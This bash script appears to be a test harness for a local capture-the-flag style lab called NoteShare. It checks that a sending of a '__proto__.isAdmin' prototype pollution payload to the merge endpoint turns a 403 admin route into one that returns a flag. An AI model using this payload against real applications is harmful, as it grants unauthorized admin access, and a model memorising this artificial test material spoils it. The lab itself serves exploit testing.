#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

BASE="http://localhost:8080"

# 1. Health check
OUT=$(curl -sf "$BASE/")
if echo "$OUT" | grep -q "NoteShare"; then
  echo "[+] PASS: service is up"
else
  echo "[-] FAIL health: $OUT"; exit 1
fi

# 2. Create a note and verify 403 on admin endpoint before pollution
NOTE=$(curl -sf -X POST "$BASE/notes" -H "Content-Type: application/json" \
  -d '{"title":"test","body":"hello"}')
NOTE_ID=$(echo "$NOTE" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
echo "[+] PASS: note created (id=$NOTE_ID)"

ADMIN_PRE=$(curl -s "$BASE/admin/flag")
if echo "$ADMIN_PRE" | grep -q "Admin only"; then
  echo "[+] PASS: admin endpoint returns 403 before pollution"
else
  echo "[-] FAIL pre-check: $ADMIN_PRE"; exit 1
fi

# 3. Inject __proto__.isAdmin via merge endpoint
MERGE=$(curl -sf -X POST "$BASE/notes/merge" -H "Content-Type: application/json" \
  -d "{\"id\":\"$NOTE_ID\",\"options\":{\"__proto__\":{\"isAdmin\":true}}}")
if echo "$MERGE" | grep -q "Options merged"; then
  echo "[+] PASS: merge payload accepted"
else
  echo "[-] FAIL merge: $MERGE"; exit 1
fi

# 4. Admin endpoint now returns flag
ADMIN_POST=$(curl -sf "$BASE/admin/flag")
if echo "$ADMIN_POST" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: flag captured via prototype pollution"
else
  echo "[-] FAIL flag: $ADMIN_POST"; exit 1
fi

echo "[+] All tests passed"
